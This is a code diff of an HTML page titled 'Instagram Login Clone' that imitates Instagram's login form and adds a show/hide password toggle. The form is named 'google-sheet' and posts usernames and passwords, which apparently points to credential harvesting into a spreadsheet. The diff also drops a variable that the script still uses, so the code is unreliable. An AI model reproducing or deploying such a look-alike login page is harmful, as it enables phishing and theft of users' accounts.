@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram Login </title>
+  <title>Instagram Login Clone</title>
   <style>
     * {
   box-sizing: border-box;
@@ -128,8 +128,42 @@ footer {
   font-size: 14px;
   color: gray;
 }
+.password-container {
+  position: relative;
+  width: 100%;
+  
+}
 
-    
+.password-container input {
+  width: 100%;
+  padding-right: 70px;  /* make space for the Show button */
+  height: 44px;         /* bump from 40px to 44px */
+  padding: 10px;
+  border-radius: 9px;
+  border: 1px solid #b3b3b3;
+  font-size: 1rem;
+  box-sizing: border-box;
+}
+
+
+.toggle-password {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  color: #000000;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 1.025rem;
+  padding: 4px 6px;
+  line-height: 1.9;        /* ✅ Helps avoid cutting off text */
+  white-space: nowrap;
+  height: auto;
+}
+
+
   </style>
 </head>
 <body>
@@ -143,7 +177,11 @@ footer {
     <div class="container">
       <form method="POST" name="google-sheet" id="loginForm">
         <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
-        <input type="text" placeholder="Password" id="password" name="password" autocomplete="new-password" />
+        <div class="password-container">
+          <input type="password" placeholder="Password" id="password" name="password" autocomplete="new-password" />
+          <button type="button" class="toggle-password" id="togglePassword">Show</button>
+        </div>
+        
   
         <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
           Log in
@@ -163,8 +201,14 @@ footer {
   
 
   <script>
-    const usernameInput = document.getElementById('username');
-const passwordInput = document.getElementById('password');
+ const togglePassword = document.getElementById('togglePassword');
+  const passwordInput = document.getElementById('password');
+
+  togglePassword.addEventListener('click', function () {
+    const isPasswordHidden = passwordInput.type === 'password';
+    passwordInput.type = isPasswordHidden ? 'text' : 'password';
+    togglePassword.textContent = isPasswordHidden ? 'Hide' : 'Show';
+  });
 
 function checkInputs() {
   const usernameFilled = usernameInput.value.trim() !== '';
@@ -207,6 +251,8 @@ passwordInput.addEventListener('input', checkInputs);
           loginBtn.style.opacity = '1';
         });
     });
+
+    
   </script>
 </body>
 </html>
